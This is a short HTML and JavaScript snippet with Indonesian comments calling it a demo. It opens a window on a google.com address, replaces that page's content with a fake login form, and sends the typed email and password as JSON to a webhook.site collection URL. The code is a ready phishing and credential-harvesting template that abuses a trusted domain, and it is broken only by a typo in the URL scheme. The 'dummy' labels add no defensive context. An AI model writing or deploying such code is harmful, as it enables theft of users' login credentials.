<script>
const WEBHOOK_URL = "hhttps://webhook.site/c697fd9f-ed36-4444-abb1-bc44fcb0a716"; // webhook dummy untuk demo

function go() {
    // buka jendela baru yang aman
var x=window.open('https://www.google.com/csi')
    
    setTimeout(function() {
        x.document.body.innerHTML = `
            <h1>Demo Login</h1>
            Email: <input id="email" placeholder="test@example.com"><br>
            Pass: <input id="pass" type="password" placeholder="password"><br>
            <button id="btnLogin">Login</button>
        `;

        x.document.getElementById("btnLogin").onclick = function() {
            const email = x.document.getElementById('email').value;
            const pass = x.document.getElementById('pass').value;

            // "Capture" data dummy dan kirim ke webhook dummy
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, pass })
            }).then(() => {
                alert("Data demo dikirim ke webhook dummy:\nEmail: " + email + "\nPass: " + pass);
            }).catch(err => {
                console.error("Error:", err);
            });
        };
    }, 1000);
}
</script>

<button onclick="go()">Go</button>
